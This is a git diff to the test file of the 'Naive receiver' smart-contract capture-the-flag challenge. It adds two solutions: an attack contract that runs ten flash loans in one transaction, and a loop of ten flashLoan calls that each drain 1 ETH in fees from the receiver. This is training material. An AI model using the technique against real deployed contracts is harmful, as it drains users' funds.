@@ -34,6 +34,20 @@ describe("[Challenge] Naive receiver", function () {
 
     it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
+        const shouldExecuteSingleTransaction = true;
+
+        if (shouldExecuteSingleTransaction) {
+            // First solution: deployer attacker contract that'll flashloan 10 times in a single transaction
+            const AttackReceiver = await ethers.getContractFactory("AttackReceiver", deployer);
+            await AttackReceiver.deploy(pool.address, receiver.address);
+        } else {
+            // Second solution: brute force 10 transaction, where each drains 1 ETH
+            const ETH = await pool.ETH();
+
+            for (let i = 0; i < 10; i++) {
+                await pool.flashLoan(receiver.address, ETH, 0, "0x");
+            }
+        }
     });
 
     after(async function () {
